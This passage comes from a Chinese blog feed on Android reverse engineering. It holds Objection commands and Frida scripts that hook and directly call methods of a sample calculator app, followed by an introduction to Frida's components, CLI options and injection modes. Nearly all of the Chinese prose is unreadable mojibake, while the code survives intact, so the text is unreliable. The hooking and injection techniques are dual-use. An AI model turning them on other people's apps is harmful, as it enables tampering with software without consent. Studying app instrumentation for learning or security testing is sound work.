class="language-bash">è¿›å…¥åˆ°objectionçš„å‘½ä»¤çª—å£ï¼Œéå†å†…å­˜ä¸­çš„æ‰€æœ‰ç±»</span></span><br><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p>åœ¨éå†å®Œæˆåé€€å‡º<code>Objection</code>æ³¨å…¥æ¨¡å¼ä»¥ç¡®ä¿<code>log</code>æ–‡ä»¶åˆ·æ–°æˆåŠŸ,  å¹¶é‡æ–°é€šè¿‡<code>cat</code>å‘½ä»¤æŸ¥çœ‹è¿™ä¸ª<code>objection.log</code>æ–‡ä»¶ï¼Œç”±äº<code>log</code>æ–‡ä»¶è¿‡å¤§ï¼Œå› æ­¤è¿˜éœ€è¦é…åˆ<code>grep</code>å‘½ä»¤è¿‡æ»¤æ–‡æœ¬ï¼Œä»è€Œé€šè¿‡è§‚å¯Ÿç»“æœæ˜¯å¦æœ‰è¾“å‡ºæ¥åˆ¤å®šå†…å­˜ä¸­æ˜¯å¦å­˜åœ¨ç›®æ ‡ç±»<code>Arith</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324151645694.png" alt="image-20250324151645694"></p><p>åœ¨åˆ¤å®šå†…å­˜ä¸­ç¡®å®å­˜åœ¨<code>Arith</code>ç±»åï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥é€šè¿‡<code>Objection</code>å‘½ä»¤åˆ¤æ–­<code>Arith</code>ç±»æ˜¯å¦å­˜åœ¨<code>sub()</code>å‡½æ•°ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324152011009.png" alt="image-20250324152011009"></p><p>åœ¨å†…å­˜ä¸­ç¡®å®šè¿™ä¸ªå‡½æ•°å­˜åœ¨åï¼Œä¾¿å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¹è¿™ä¸ªå‡½æ•°è¿›è¡Œ<code>Hook</code>äº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method com.example.junior.util.Arith.sub --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç¡®è®¤è¿™ä¸ªç®€å•è®¡ç®—å™¨çš„å‡æ³•æ˜¯é€šè¿‡<code>sub(java.lang.String,  java.lang.String)</code>å®ç°çš„ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324233129462.png" alt="image-20250324233129462"></p><p>è¿™é‡Œæˆ‘ä½¿ç”¨äº†è®¡ç®—å™¨çš„å‡æ³•æ—¶ï¼Œå‘ç°æ²¡èƒ½è§¦å‘<code>hook</code>ï¼Œè¿™é‡Œ<code>hook</code>å¤±è´¥äº†ã€‚</p><p>ç„¶åæˆ‘ä½¿ç”¨åŒæ ·çš„æ–¹æ³•å°è¯•äº†å…¶å®ƒçš„<code>App</code><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>ï¼ŒæˆåŠŸ<code>hook</code>ï¼Œå¯èƒ½æ˜¯æˆ‘ä¸‹è½½çš„<code>junior</code>æ¥æºæœ‰ç‚¹é—®é¢˜ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method com.zj.wuaipojie.Demo.a --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324234444822.png" alt="image-20250324234444822"></p><h4 id="2ã€åˆ©ç”¨ï¼šFridaè„šæœ¬ä¿®æ”¹å‚æ•°">2ã€åˆ©ç”¨ï¼šFridaè„šæœ¬ä¿®æ”¹å‚æ•°</h4><p>å‰é¢æˆ‘ä»¬ç¡®è®¤äº†<code>Arith</code>ç±»çš„å‡½æ•°<code>sub(java.lang.String, java.lang.String)</code>æ˜¯æœ€ç»ˆè®¡ç®—å™¨å‡æ³•çš„çœŸå®æ‰§è¡Œå‡½æ•°ã€‚è¿™é‡Œå°è¯•ä½¿ç”¨<code>frida</code>çš„è„šæœ¬å»è¿›è¡Œ<code>hook</code>è¿™ä¸ª<code>sub</code>å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Arith</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.junior.util.Arith&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook Arith.sub() æ–¹æ³•</span></span><br><span class="line">        <span class="title class_">Arith</span>.<span class="property">sub</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str1, str2</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">sub</span>(str1, str2);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;str1,str2,result =&gt;&#x27;</span>,str1,str2,result);</span><br><span class="line">            <span class="comment">//æ‰“å°Javaè°ƒç”¨æ ˆ</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>ä»ç„¶æ˜¯<code>hook</code>å¤±è´¥çš„ï¼Œè¿›è¡Œå‡æ³•æ“ä½œæ— ä»»ä½•ååº”ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324235914989.png" alt="image-20250324235914989"></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œ<code>Frida</code>è„šæœ¬ä¸­<code>Java</code>å‡½æ•°çš„ä¸»åŠ¨è°ƒç”¨(åŒºåˆ†é™æ€å‡½æ•°å’Œå®ä¾‹å‡½æ•°)ã€‚å¦‚æœæ˜¯é™æ€å‡½æ•°ï¼Œåªéœ€è¦è·å–ç±»å¯¹è±¡å³å¯ç›´æ¥å®Œæˆå‡½æ•°çš„ä¸»åŠ¨è°ƒç”¨ï¼›å¦‚æœæ˜¯å®ä¾‹å‡½æ•°ï¼Œåªéœ€è¦ä¼˜å…ˆè·å–åˆ°ç±»çš„å®ä¾‹å¯¹è±¡å³å¯å®Œæˆå‡½æ•°çš„ä¸»åŠ¨è°ƒç”¨ã€‚</p><p>ä¸»åŠ¨è°ƒç”¨çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Arith</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.junior.util.Arith&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">JavaString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> reuslt = <span class="title class_">Arith</span>.<span class="title function_">sub</span>(<span class="title class_">JavaString</span>.$new(<span class="string">&#x27;123&#x27;</span>),<span class="title class_">JavaString</span>.$new(<span class="string">&#x27;112&#x27;</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(reuslt);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>æˆåŠŸè°ƒç”¨ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325000255731.png" alt="image-20250325000255731"></p><p>ä¸»åŠ¨è°ƒç”¨å¯ä»¥ï¼Œä½†æ˜¯è¢«åŠ¨è°ƒç”¨å°±ä¸è¡Œï¼Œè¿™é‡Œå¯èƒ½æ˜¯<code>App</code>çš„é—®é¢˜ã€‚</p><p>æ·±å…¥åˆ°<code>Arith.java</code>ä»£ç <sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>ä¸­ï¼Œå‘ç°<code>sub</code>å‡½æ•°çš„å®ç°ä½¿ç”¨äº†<code>BigDecimal</code>å‡½æ•°ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325001453566.png" alt="image-20250325001453566"></p><p>å°è¯•å»<code>hook</code>è¿™ä¸ªä»£ç ï¼Œå‘ç°æˆåŠŸ<code>hook</code>ï¼Œè¿™é‡Œä¸æ¸…æ¥šä¸ºä»€ä¹ˆã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325001629404.png" alt="image-20250325001629404"></p><p><code>hook</code>çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BigDecimal</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.math.BigDecimal&quot;</span>);</span><br><span class="line">        <span class="comment">// æ„é€ å‡½æ•° hookï¼ˆéªŒè¯å‚æ•°ï¼‰</span></span><br><span class="line">        <span class="comment">// BigDecimal.$init.overloads.forEach(function(overload)&#123;</span></span><br><span class="line">        <span class="comment">//     overload.implementation = function()&#123;</span></span><br><span class="line">        <span class="comment">//         console.log(&quot;[Hooked BigDecimal constructor] called:&quot;, overload.toString());</span></span><br><span class="line">        <span class="comment">//         for(var i=0; i&lt;arguments.length; i++)&#123;</span></span><br><span class="line">        <span class="comment">//             console.log(&quot;  arg[&quot;+i+&quot;]: &quot; + arguments[i]);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//         return overload.apply(this, arguments);</span></span><br><span class="line">        <span class="comment">//     &#125;;</span></span><br><span class="line">        <span class="comment">// &#125;);</span></span><br><span class="line">        <span class="comment">// subtract æ–¹æ³• hookï¼ˆæ•æ‰æ ¸å¿ƒè¿ç®—ï¼‰</span></span><br><span class="line">        <span class="title class_">BigDecimal</span>.<span class="property">subtract</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.math.BigDecimal&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">b2</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[Hooked BigDecimal.subtract] called&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  self:&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  arg :&quot;</span>, b2.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">subtract</span>(b2);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  result:&quot;</span>, result.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ">å‚è€ƒ</h3><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>ã€Šå®‰å“Fridaé€†å‘ä¸æŠ“åŒ…å®æˆ˜ã€‹ é™ˆä½³æ—/è‘— <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://github.com/aqi00/android2">https://github.com/aqi00/android2</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://github.com/x2nn/android_security/blob/main/junior.apk">https://github.com/x2nn/android_security/blob/main/junior.apk</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/x2nn/android_security/blob/main/woaipojie.apk">https://github.com/x2nn/android_security/blob/main/woaipojie.apk</a> <a href="#fnref4" class="footnote-backref">â†©ï¸</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/aqi00/android2/blob/master/junior/src/main/java/com/example/junior/util/Arith.java#L3">https://github.com/aqi00/android2/blob/master/junior/src/main/java/com/example/junior/util/Arith.java#L3</a> <a href="#fnref5" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å“é€†å‘ </tag>
            
            <tag> Objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fridaå­¦ä¹ </title>
      <link href="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä»€ä¹ˆæ˜¯Frida">ä¸€ã€ä»€ä¹ˆæ˜¯Frida?</h2><p><code>Frida</code> æ˜¯ä¸€æ¬¾å¼€æºçš„åŠ¨æ€æ’æ¡©å·¥å…·ï¼Œå¯ä»¥æ’å…¥ä¸€äº›ä»£ç åˆ°åŸç”ŸAppçš„å†…å­˜ç©ºé—´å»åŠ¨æ€åœ°ç›‘è§†å’Œä¿®æ”¹å…¶è¡Œä¸ºï¼Œæ”¯æŒWindowsã€Macã€Linuxã€Androidæˆ–è€…iOSï¼Œä»å®‰å“å±‚é¢æ¥è®²ï¼Œå¯ä»¥å®ç°<code>Java</code>å±‚å’Œ<code>Native</code>å±‚<code>Hook</code>æ“ä½œã€‚<br><a href="https://github.com/frida/frida">é¡¹ç›®åœ°å€</a><br><a href="https://frida.re/">å®˜ç½‘åŠä½¿ç”¨æ–‡æ¡£</a></p><h2 id="äºŒã€FridaåŸç†åŠé‡è¦ç»„ä»¶">äºŒã€FridaåŸç†åŠé‡è¦ç»„ä»¶</h2><p><code>Frida</code>æ³¨å…¥çš„åŸç†å°±æ˜¯æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹,ä½¿ç”¨<code>ptrace</code>è·Ÿè¸ªç›®æ ‡è¿›ç¨‹è·å–<code>mmap</code>ï¼Œ<code>dlpoen</code>ï¼Œ<code>dlsym</code>ç­‰å‡½æ•°åº“çš„åç§»è·å–<code>mmap</code>åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´å°†åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰¾åˆ°å­˜æ”¾<code>frida-agent-32/64.so</code>çš„ç©ºé—´å¯åŠ¨æ‰§è¡Œå„ç§æ“ä½œç”±<code>agent</code>å»å®ç°ã€‚</p><table><thead><tr><th>ç»„ä»¶åç§°</th><th style="text-align:center">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>frida-gum</td><td style="text-align:center">æä¾›äº†<code>inline-hook</code>çš„æ ¸å¿ƒå®ç°ï¼Œè¿˜åŒ…å«äº†ä»£ç è·Ÿè¸ªæ¨¡å—<code>Stalker</code>ï¼Œç”¨äºå†…å­˜è®¿é—®ç›‘æ§çš„<code>MemoryAccessMonitor</code>ï¼Œä»¥åŠç¬¦å·æŸ¥æ‰¾ã€æ ˆå›æº¯å®ç°ã€å†…å­˜æ‰«æã€åŠ¨æ€ä»£ç ç”Ÿæˆå’Œé‡å®šä½ç­‰åŠŸèƒ½</td></tr><tr><td>frida-core</td><td style="text-align:center"><code>fridahook</code>çš„æ ¸å¿ƒï¼Œå…·æœ‰è¿›ç¨‹æ³¨å…¥ã€è¿›ç¨‹é—´é€šä¿¡ã€ä¼šè¯ç®¡ç†ã€è„šæœ¬ç”Ÿå‘½å‘¨æœŸç®¡ç†ç­‰åŠŸèƒ½ï¼Œå±è”½éƒ¨åˆ†åº•å±‚çš„å®ç°ç»†èŠ‚å¹¶ç»™æœ€ç»ˆç”¨æˆ·æä¾›å¼€ç®±å³ç”¨çš„æ“ä½œæ¥å£ã€‚åŒ…å«äº†<code>frida-server</code>ã€<code>frida-gadget</code>ã€<code>frida-agent</code>ã€<code>frida-helper</code>ã€<code>frida-inject</code>ç­‰å…³é”®æ¨¡å—å’Œç»„ä»¶ï¼Œä»¥åŠä¹‹é—´çš„äº’ç›¸é€šä¿¡åº•åº§</td></tr><tr><td>frida-gadget</td><td style="text-align:center">æœ¬èº«æ˜¯ä¸€ä¸ªåŠ¨æ€åº“ï¼Œå¯ä»¥é€šè¿‡é‡æ‰“åŒ…ä¿®æ”¹åŠ¨æ€åº“çš„ä¾èµ–æˆ–è€…ä¿®æ”¹<code>smali</code>ä»£ç å»å®ç°å‘ä¸‰æ–¹åº”ç”¨æ³¨å…¥<code>gadget</code>ï¼Œä»è€Œå®ç°<code>Frida</code>çš„æŒä¹…åŒ–æˆ–å…<code>root</code></td></tr><tr><td>frida-server</td><td style="text-align:center">æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç±»ä¼¼äºå‰é¢å­¦ä¹ åˆ°çš„<code>android_server</code>ï¼Œéœ€è¦åœ¨ç›®æ ‡è®¾å¤‡ä¸Šè¿è¡Œå¹¶è½¬å‘ç«¯å£ï¼Œåœ¨<code>Frida hook</code>ä¸­èµ·åˆ°å…³é”®ä½œç”¨</td></tr></tbody></table><h2 id="ä¸‰ã€FridaåŸºç¡€çŸ¥è¯†">ä¸‰ã€FridaåŸºç¡€çŸ¥è¯†</h2><h3 id="ï¼ˆ1ï¼‰åŸºç¡€æŒ‡ä»¤">ï¼ˆ1ï¼‰åŸºç¡€æŒ‡ä»¤</h3><p><code>frida-ps -U</code> æŸ¥çœ‹å½“å‰æ‰‹æœºè¿è¡Œçš„è¿›ç¨‹ã€‚<br><code>frida-ps --help</code> æŸ¥çœ‹<code>help</code> æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">frida-ps --help</span><br><span class="line">ä½¿ç”¨æ–¹å¼: frida-ps [é€‰é¡¹]</span><br><span class="line"></span><br><span class="line">é€‰é¡¹:</span><br><span class="line">  -h, --help            æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">  -D ID, --device ID    è¿æ¥åˆ°å…·æœ‰ç»™å®šIDçš„è®¾å¤‡</span><br><span class="line">  -U, --usb             è¿æ¥åˆ°USBè®¾å¤‡</span><br><span class="line">  -R, --remote          è¿æ¥åˆ°è¿œç¨‹frida-server</span><br><span class="line">  -H HOST, --host HOST  è¿æ¥åˆ°HOSTä¸Šçš„è¿œç¨‹frida-server</span><br><span class="line">  --certificate CERTIFICATE</span><br><span class="line">                        ä¸HOSTè¿›è¡ŒTLSé€šä¿¡ï¼ŒæœŸæœ›çš„CERTIFICATE</span><br><span class="line">  --origin ORIGIN       è¿æ¥åˆ°è®¾ç½®äº†&quot;Origin&quot;å¤´ä¸ºORIGINçš„è¿œç¨‹æœåŠ¡å™¨</span><br><span class="line">  --token TOKEN         ä½¿ç”¨TOKENéªŒè¯HOST</span><br><span class="line">  --keepalive-interval INTERVAL</span><br><span class="line">                        è®¾ç½®å¿ƒè·³åŒ…é—´éš”(ç§’)ï¼Œæˆ–è®¾ç½®ä¸º0ä»¥ç¦ç”¨(é»˜è®¤ä¸º-1ï¼Œæ ¹æ®ä¼ è¾“æ–¹å¼è‡ªåŠ¨é€‰æ‹©)</span><br><span class="line">  --p2p                 ä¸ç›®æ ‡å»ºç«‹ç‚¹å¯¹ç‚¹è¿æ¥</span><br><span class="line">  --stun-server ADDRESS</span><br><span class="line">                        è®¾ç½®ä¸--p2pä¸€èµ·ä½¿ç”¨çš„STUNæœåŠ¡å™¨åœ°å€</span><br><span class="line">  --relay address,username,password,turn-&#123;udp,tcp,tls&#125;</span><br><span class="line">                        æ·»åŠ ä¸--p2pä¸€èµ·ä½¿ç”¨çš„ä¸­ç»§</span><br><span class="line">  -O FILE, --options-file FILE</span><br><span class="line">                        åŒ…å«é¢å¤–å‘½ä»¤è¡Œé€‰é¡¹çš„æ–‡æœ¬æ–‡ä»¶</span><br><span class="line">  --version             æ˜¾ç¤ºç¨‹åºç‰ˆæœ¬å·å¹¶é€€å‡º</span><br><span class="line">  -a, --applications    åªåˆ—å‡ºåº”ç”¨ç¨‹åº</span><br><span class="line">  -i, --installed       åŒ…æ‹¬æ‰€æœ‰å·²å®‰è£…çš„åº”ç”¨ç¨‹åº</span><br><span class="line">  -j, --json            ä»¥JSONæ ¼å¼è¾“å‡ºç»“æœ</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ2ï¼‰æ“ä½œæ¨¡å¼">ï¼ˆ2ï¼‰æ“ä½œæ¨¡å¼</h3><table><thead><tr><th style="text-align:left">æ“ä½œæ¨¡å¼</th><th style="text-align:left">æè¿°</th><th style="text-align:left">ä¼˜ç‚¹</th><th style="text-align:left">ä¸»è¦ç”¨é€”</th></tr></thead><tbody><tr><td style="text-align:left">CLIï¼ˆå‘½ä»¤è¡Œï¼‰æ¨¡å¼</td><td style="text-align:left">é€šè¿‡å‘½ä»¤è¡Œç›´æ¥å°†JavaScriptè„šæœ¬æ³¨å…¥è¿›ç¨‹ä¸­ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œ</td><td style="text-align:left">ä¾¿äºç›´æ¥æ³¨å…¥å’Œæ“ä½œ</td><td style="text-align:left">åœ¨è¾ƒå°è§„æ¨¡çš„æ“ä½œæˆ–è€…éœ€æ±‚æ¯”è¾ƒç®€å•çš„åœºæ™¯ä¸­ä½¿ç”¨</td></tr><tr><td style="text-align:left">RPCæ¨¡å¼</td><td style="text-align:left">ä½¿ç”¨Pythonè¿›è¡ŒJavaScriptè„šæœ¬çš„æ³¨å…¥å·¥ä½œï¼Œå®é™…å¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œçš„è¿˜æ˜¯JavaScriptè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡RPCä¼ è¾“ç»™Pythonè„šæœ¬æ¥è¿›è¡Œå¤æ‚æ•°æ®çš„å¤„ç†</td><td style="text-align:left">åœ¨å¯¹å¤æ‚æ•°æ®çš„å¤„ç†ä¸Šå¯ä»¥é€šè¿‡RPCä¼ è¾“ç»™Pythonè„šæœ¬æ¥è¿›è¡Œï¼Œæœ‰åˆ©äºå‡å°‘è¢«æ³¨å…¥è¿›ç¨‹çš„æ€§èƒ½æŸè€—</td><td style="text-align:left">åœ¨å¤§è§„æ¨¡è°ƒç”¨ä¸­æ›´åŠ æ™®éï¼Œç‰¹åˆ«æ˜¯å¯¹äºå¤æ‚æ•°æ®å¤„ç†çš„éœ€æ±‚</td></tr></tbody></table><h3 id="ï¼ˆ3ï¼‰æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤">ï¼ˆ3ï¼‰æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤</h3><table><thead><tr><th style="text-align:left">æ³¨å…¥æ¨¡å¼</th><th style="text-align:left">æè¿°</th><th style="text-align:left">å‘½ä»¤æˆ–å‚æ•°</th><th style="text-align:left">ä¼˜ç‚¹</th><th style="text-align:left">ä¸»è¦ç”¨é€”</th></tr></thead><tbody><tr><td style="text-align:left">Spawnæ¨¡å¼</td><td style="text-align:left">å°†å¯åŠ¨Appçš„æƒåˆ©äº¤ç”±Fridaæ¥æ§åˆ¶ï¼Œå³ä½¿ç›®æ ‡Appå·²ç»å¯åŠ¨ï¼Œåœ¨ä½¿ç”¨Fridaæ³¨å…¥ç¨‹åºæ—¶è¿˜æ˜¯ä¼šé‡æ–°å¯åŠ¨App</td><td style="text-align:left">åœ¨CLIæ¨¡å¼ä¸­ï¼ŒFridaé€šè¿‡åŠ ä¸Š -f å‚æ•°æŒ‡å®šåŒ…åä»¥spawnæ¨¡å¼æ“ä½œApp</td><td style="text-align:left">é€‚åˆäºéœ€è¦åœ¨Appå¯åŠ¨æ—¶å³è¿›è¡Œæ³¨å…¥çš„åœºæ™¯ï¼Œå¯ä»¥åœ¨Appå¯åŠ¨æ—¶å³æ•è·å…¶è¡Œä¸º</td><td style="text-align:left">å½“éœ€è¦ç›‘æ§Appä»å¯åŠ¨å¼€å§‹çš„æ‰€æœ‰è¡Œä¸ºæ—¶ä½¿ç”¨</td></tr><tr><td style="text-align:left">Attachæ¨¡å¼</td><td style="text-align:left">åœ¨ç›®æ ‡Appå·²ç»å¯åŠ¨çš„æƒ…å†µä¸‹ï¼ŒFridaé€šè¿‡ptraceæ³¨å…¥ç¨‹åºä»è€Œæ‰§è¡ŒHookçš„æ“ä½œ</td><td style="text-align:left">åœ¨CLIæ¨¡å¼ä¸­ï¼Œå¦‚æœä¸æ·»åŠ  -f å‚æ•°ï¼Œåˆ™é»˜è®¤ä¼šé€šè¿‡attachæ¨¡å¼æ³¨å…¥App</td><td style="text-align:left">é€‚åˆäºå·²ç»è¿è¡Œçš„Appï¼Œä¸ä¼šé‡æ–°å¯åŠ¨Appï¼Œå¯¹ç”¨æˆ·ä½“éªŒå½±å“è¾ƒå°</td><td style="text-align:left">åœ¨Appå·²ç»å¯åŠ¨ï¼Œæˆ–è€…æˆ‘ä»¬åªå…³å¿ƒç‰¹å®šæ—¶åˆ»æˆ–ç‰¹å®šåŠŸèƒ½çš„è¡Œä¸ºæ—¶ä½¿ç”¨</td></tr></tbody></table><h4 id="Spawnæ¨¡å¼">Spawnæ¨¡å¼</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f è¿›ç¨‹å -l hook.js</span><br></pre></td></tr></table></figure><h4 id="Attachæ¨¡å¼">Attachæ¨¡å¼</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U è¿›ç¨‹å -l hook.js</span><br></pre></td></tr></table></figure><h4 id="Frida-Serverè‡ªå®šä¹‰ç«¯å£">Frida_Serverè‡ªå®šä¹‰ç«¯å£</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frida server é»˜è®¤ç«¯å£ï¼š27042</span><br><span class="line"></span><br><span class="line">taimen:/ $ su</span><br><span class="line">taimen:/ # cd data/local/tmp/</span><br><span class="line">taimen:/data/local/tmp # ./fs1280 -l 0.0.0.0:6666</span><br></pre></td></tr></table></figure><p><code>logcat | grep &quot;D.zj2595&quot;</code>æ—¥å¿—æ•è·<br><code>adb connect 127.0.0.1:62001</code>æ¨¡æ‹Ÿå™¨ç«¯å£è½¬å‘</p><h3 